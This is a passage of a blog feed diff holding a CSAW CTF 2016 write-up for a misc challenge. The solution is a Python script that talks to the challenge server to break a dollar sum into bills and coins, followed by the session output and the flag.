-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
-<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p><em>#Hope #Change #Obama2008</em></p>
-<p><code>nc misc.chal.csaw.io 8000</code></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The problem here is to split up a sum of money into its equivalent in bills and coins (minimum).</p>
-<p>Here we have to script again:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">total = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(s, pattern, tryouts)</span>:</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(tryouts):</div><div class="line">        <span class="comment"># sleep(1)</span></div><div class="line">        data += s.recv(<span class="number">9999</span>)</div><div class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> data:</div><div class="line">            <span class="keyword">return</span> data</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(bills)</span>:</span></div><div class="line">    <span class="keyword">global</span> total</div><div class="line">    times = Decimal(str(total)) / Decimal(str(bills))</div><div class="line">    <span class="keyword">if</span> times &gt;= <span class="number">1</span>:</div><div class="line">        total = Decimal(str(total)) - Decimal(str(int(times))) * Decimal(str(bills))</div><div class="line">    <span class="keyword">return</span> int(times)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> total</div><div class="line">    url = <span class="string">"misc.chal.csaw.io"</span></div><div class="line">    port = <span class="number">8000</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((url, port))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        task = recvuntil(s, <span class="string">"$10,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">        print(task)</div><div class="line">        total = re.findall(<span class="string">"\$(.*)\s+\$10,000 bills:"</span>, task)</div><div class="line">        <span class="keyword">if</span> len(total) == <span class="number">0</span>:</div><div class="line">            print(task)</div><div class="line">            sleep(<span class="number">10</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># print(total[0])</span></div><div class="line">            total = Decimal(str(total[<span class="number">0</span>]))</div><div class="line"></div><div class="line">            <span class="comment"># $10,000 bills:</span></div><div class="line">            to_send = str(calc(<span class="number">10000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $500 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$500 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">500</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $100 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$100 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">100</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $50 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$50 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $20 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$20 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">20</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $10 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$10 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># half-dollars (50c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"half-dollars (50c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># quarters (25c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"quarters (25c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.25</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># dimes (10c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"dimes (10c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># nickels (5c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"nickels (5c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.05</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># pennies (1c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"pennies (1c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.01</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
-<p>Oh yeah this script is dirty and can be a lot more functional but you know in CTF all is a matter of time…</p>
-<p>Proof of flag:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$22479.22</div><div class="line">$10,000 bills:</div><div class="line">2</div><div class="line">$5,000 bills:</div><div class="line">0</div><div class="line">$1,000 bills:</div><div class="line">2</div><div class="line">$500 bills:</div><div class="line">0</div><div class="line">$100 bills:</div><div class="line">4</div><div class="line">$50 bills:</div><div class="line">1</div><div class="line">$20 bills:</div><div class="line">1</div><div class="line">$10 bills:</div><div class="line">0</div><div class="line">$5 bills:</div><div class="line">1</div><div class="line">$1 bills:</div><div class="line">4</div><div class="line">half-dollars (50c):</div><div class="line">0</div><div class="line">quarters (25c):</div><div class="line">0</div><div class="line">dimes (10c):</div><div class="line">2</div><div class="line">nickels (5c):</div><div class="line">0</div><div class="line">pennies (1c):</div><div class="line">2</div><div class="line">correct!</div><div class="line">flag&#123;started-from-the-bottom-now-my-whole-team-fucking-here&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
     
   </entry>
   
